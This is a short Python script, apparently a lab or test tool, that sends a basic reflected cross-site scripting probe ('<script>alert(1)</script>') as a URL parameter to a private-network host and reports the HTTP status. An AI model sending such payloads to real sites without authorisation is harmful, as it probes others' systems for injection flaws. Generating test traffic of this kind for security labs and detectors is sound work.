#!/usr/bin/env python3
import urllib.parse
import urllib.request

payload = "<script>alert(1)</script>"
q = urllib.parse.quote(payload, safe="")

url = f"http://10.0.0.4:5001/?xss={q}"
try:
    with urllib.request.urlopen(url, timeout=3) as r:
        print(f"XSS simulation sent to {url} -> HTTP {r.status}")
except Exception as e:
    print(f"XSS simulation error: {e}")
